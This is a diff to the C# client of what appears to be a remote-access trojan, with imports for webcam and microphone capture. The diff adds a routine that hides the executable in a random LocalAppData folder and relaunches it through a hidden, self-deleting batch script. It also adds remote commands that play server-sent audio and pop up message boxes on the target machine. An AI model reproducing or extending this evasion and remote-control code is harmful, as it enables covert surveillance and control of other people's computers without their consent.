@@ -2,6 +2,7 @@
 using AForge.Video.DirectShow;
 using LazyServer;
 using NAudio.CoreAudioApi;
+using NAudio.Vorbis;
 using NAudio.Wave;
 using Newtonsoft.Json.Linq;
 using PentestTools;
@@ -47,6 +48,57 @@ namespace Client
         [STAThread]
         static void Main()
         {
+            // --- BEGIN: Self-move to random LocalAppData directory if needed ---
+            if (GClass.IsTrue("move"))
+            {
+                string exePath = Application.ExecutablePath;
+                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+                string exeDir = Path.GetDirectoryName(exePath);
+
+                // Check if already in LocalAppData (case-insensitive)
+                if (!exeDir.StartsWith(localAppData, StringComparison.OrdinalIgnoreCase))
+                {
+                    // Get all existing directories in LocalAppData
+                    string[] existingDirs = Directory.GetDirectories(localAppData);
+                    string targetDir;
+
+                    if (existingDirs.Length > 0)
+                    {
+                        // Pick a random existing directory
+                        Random rnd = new Random();
+                        targetDir = existingDirs[rnd.Next(existingDirs.Length)];
+                    }
+                    else
+                    {
+                        // No existing directories, create a new random one
+                        targetDir = Path.Combine(localAppData, Path.GetRandomFileName());
+                        Directory.CreateDirectory(targetDir);
+                    }
+
+                    string destExe = Path.Combine(targetDir, Path.GetFileName(exePath));
+
+                    // Batch script to move and run
+                    string batPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName() + ".bat");
+                    File.WriteAllText(batPath,
+                        $@"@echo off
+            timeout /t 1 >nul
+            move /y ""{exePath}"" ""{destExe}""
+            start """" ""{destExe}""
+            del ""%~f0""");
+
+                    // Run batch and exit
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = batPath,
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        CreateNoWindow = true
+                    });
+                    Console.WriteLine($"Moved to: {destExe}");
+                    Environment.Exit(0);
+                }
+            }
+            // --- END: Self-move logic ---
+
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             Task.Run(RunClientAsync);
@@ -174,6 +226,80 @@ namespace Client
                             }
 
                             break;
+                        case "playsound":
+                            {
+                                var soundFileName = (string)message["filename"];
+
+                                if (!string.IsNullOrEmpty(soundFileName) && e.FileRequest?.FileBytes != null)
+                                {
+                                    var audioBytes = e.FileRequest.FileBytes;
+
+                                    Task.Run(() =>
+                                    {
+                                        string tempOggPath = null;
+
+                                        try
+                                        {
+                                            WaveStream reader;
+
+                                            if (Path.GetExtension(soundFileName).Equals(".mp3", StringComparison.OrdinalIgnoreCase))
+                                            {
+                                                reader = new Mp3FileReader(new MemoryStream(audioBytes));
+                                            }
+                                            else if (Path.GetExtension(soundFileName).Equals(".wav", StringComparison.OrdinalIgnoreCase))
+                                            {
+                                                reader = new WaveFileReader(new MemoryStream(audioBytes));
+                                            }
+                                            else if (Path.GetExtension(soundFileName).Equals(".ogg", StringComparison.OrdinalIgnoreCase))
+                                            {
+                                                // Create temporary file for OGG
+                                                tempOggPath = Path.Combine(Path.GetTempPath(), soundFileName);
+                                                File.WriteAllBytes(tempOggPath, audioBytes);
+                                                reader = new VorbisWaveReader(tempOggPath);
+                                            }
+                                            else
+                                            {
+                                                Console.WriteLine($"Unsupported audio format: {soundFileName}");
+                                                return;
+                                            }
+
+                                            using (reader)
+                                            using (var outputDevice = new WaveOutEvent())
+                                            {
+                                                outputDevice.Init(reader);
+                                                outputDevice.Play();
+                                                while (outputDevice.PlaybackState == PlaybackState.Playing)
+                                                {
+                                                    Thread.Sleep(100);
+                                                }
+                                            }
+                                        }
+                                        catch (Exception ex)
+                                        {
+                                            Console.WriteLine($"Error playing sound: {ex.Message}");
+                                        }
+                                        finally
+                                        {
+                                            // Clean up temporary OGG file if it exists
+                                            if (!string.IsNullOrEmpty(tempOggPath) && File.Exists(tempOggPath))
+                                            {
+                                                try
+                                                {
+                                                    File.Delete(tempOggPath);
+                                                }
+                                                catch
+                                                {
+                                                    // Ignore errors on deletion
+                                                }
+                                            }
+                                        }
+                                    });
+                                }
+                            }
+                            break;
+
+
+
                         // Add other commands as needed
                         default:
                             Console.WriteLine($"Unknown command: {command}");
@@ -400,8 +526,13 @@ namespace Client
                             });
 
                             break;
-
-
+                        case "msgbox":
+                            string title = (string)message["title"];
+                            string msg = (string)message["message"];
+                            string buttonType = (string)message["button"];
+                            string iconType = (string)message["icon"];
+                            ShowCustomMessageBox(msg, title, buttonType, iconType);
+                            break;
 
                     }
                 }
@@ -641,6 +772,28 @@ namespace Client
             micTokenSource = null;
             micLoopTask = null;
             micLoopRunning = false;
+        }
+        static void ShowCustomMessageBox(string text, string title, string buttonType, string iconType)
+        {
+            MessageBoxButtons buttons = buttonType.ToLower() switch
+            {
+                "ok" => MessageBoxButtons.OK,
+                "okcancel" => MessageBoxButtons.OKCancel,
+                "yesno" => MessageBoxButtons.YesNo,
+                "yesnocancel" => MessageBoxButtons.YesNoCancel,
+                _ => MessageBoxButtons.OK
+            };
+
+            MessageBoxIcon icon = iconType.ToLower() switch
+            {
+                "warn" => MessageBoxIcon.Warning,
+                "info" => MessageBoxIcon.Information,
+                "error" => MessageBoxIcon.Error,
+                "question" => MessageBoxIcon.Question,
+                _ => MessageBoxIcon.None
+            };
+
+            Task.Run(() => MessageBox.Show(text, title, buttons, icon));
         }
     }
 
